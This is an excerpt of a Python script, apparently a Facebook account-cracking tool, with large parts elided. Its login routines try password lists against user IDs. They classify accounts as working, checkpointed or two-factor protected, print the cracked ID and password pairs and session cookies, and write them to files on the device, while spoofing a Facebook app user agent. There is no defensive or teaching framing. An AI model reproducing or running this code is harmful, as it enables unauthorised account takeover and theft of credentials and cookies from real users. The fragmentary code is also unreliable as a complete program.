...
===============================================
 [â¢]\033[1;37m AUTHOR       : \033[1;37m MK BRAND014
...
def freefb(uid, name, pwx, tl):
    ...
    global oks
    global cps
    sys.stdout.write("\r\033[1;37m [mkM1] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
    sys.stdout.flush()
    try:
        first = name.split(" ")[0]
        try:
        ...
        for ps in pwx:
            ...
            if "c_user" in log_cookies:
                ...
                if "Enter login code to continue" in log_cookies:
                    print(f" {cyan}[mk2F] {uid}|{pw}")
                    open("/sdcard/dev_file_2F.txt", "a").write(f"{uid}|{pw}\n")
                    twf.append(uid+"|"+pw)
                    break
                else:
                   #print(f" {red}[mkCP] {uid}|{pw}")
...
def bapi(uid, name, pwx, tl):
    ...
    global oks
    global cps
    sys.stdout.write("\r\033[1;37m [mkM2] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
    sys.stdout.flush()
    try:
        first = name.split(" ")[0]
        try:
...
def graph(uid, name, pwx, tl):
    ...
    global oks
    global cps
    sys.stdout.write("\r\033[1;37m [mkM3] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
    sys.stdout.flush()
    try:
        first = name.split(" ")[0]
        try:
                ...
                if "live" in c:
                    if result["is_account_confirmed"] == False:
                       ...
                       #print(f" {green}[COOKIES] {green}{coki}")
                        open("/sdcard/mknovery.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                    else:
                        print(f" {green}[mkOK] {uid}|{pw}")
                       #print(f" {green}[COOKIES] {green}{coki}")
            ...
            if 'c_user' in log_cookies:
                ...
                if "live" in check_lock(cid):
                    if '%3A-1%3A-1' in coki:
                        print('\33[1;94m[mkNV] '+cid+' | '+ps+'\33[0;97m')
                        break
                    else:
                        print('\33[1;92m[mkOK] '+cid+' | '+ps+'\33[0;97m')
                        if "yes" in cookie_show:
                            print(f"\033[1;32mCOOKIES : {coki}")
                            open('/sdcard/mkRndm-Ok.txt', 'a').write(f'{cid}|{ps}|{coki}\n')
                            oks.append(cid)
                            break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                if "Enter login code to continue" in log_cookies:
                    #print('\33[1;94m[mk2F] '+uid+' | '+ps+'\33[0;97m')
                    open('/sdcard/mk2f.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                    break
                else:
                    #print('\33[1;91m[mkCP] '+uid+' | '+ps+'\33[0;97m')
                    open('/sdcard/mkCp.txt', 'a').write(uid+' | '+ps+'\n')
                    cps.append(uid)
                    break
            else:
                continue
...
"Mozilla/5.0 (Linux; Android 12; SM-N970F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.131 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.33.69;]",
            ...
            if "c_user" in response:
                ...
                if "live" in check:
                    if '%3A-1%3A-1' in coki:
                        print(f" {cyan}(mk2F) {cid}|{pw} ")
                        break
                    else:
                        print(f" {green}(mkOK) {cid}|{pw} ")
                       #print(f" {white}Cookie : {green}{coki}")
                        open("/sdcard/mk-ok.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                        oks.append(cid)
                        break
                else:
                    break
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                #print('\33[1;91m[mkCP] '+uid+' | '+pw+'\33[0;97m')
                open('/sdcard/mkCp.txt', 'a').write(uid+' | '+pw+'\n')
                cps.append(uid)
                break
            else:
                continue
